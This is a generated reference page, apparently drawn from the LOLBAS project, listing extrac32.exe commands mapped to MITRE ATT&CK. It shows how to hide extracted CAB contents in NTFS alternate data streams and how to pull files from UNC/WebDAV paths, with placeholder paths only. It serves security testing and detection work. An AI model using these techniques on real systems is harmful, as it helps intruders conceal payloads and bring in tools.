---
parsed_by: focuslocust
source: commands
type: generated
---
# Extrac32 Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Extrac32.exe

Tool page: [Extrac32.exe](../../tools/windows/extrac32.exe.md)

### Extract data from cab file and hide it in an alternate data stream.

```text
extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
```

Description:

Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Extrac32.yml` |
| Evidence | Command preserved from source parser. |

### Extract data from cab file and hide it in an alternate data stream.

```text
extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
```

Description:

Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Extrac32.yml` |
| Evidence | Command preserved from source parser. |

### Download file from UNC/WEBDav

```text
extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}
```

Description:

Copy the source file to the destination file and overwrite it.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Extrac32.yml` |
| Evidence | Command preserved from source parser. |

### Copy file

```text
extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}
```

Description:

Command for copying file from one folder to another

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Extrac32.yml` |
| Evidence | Command preserved from source parser. |
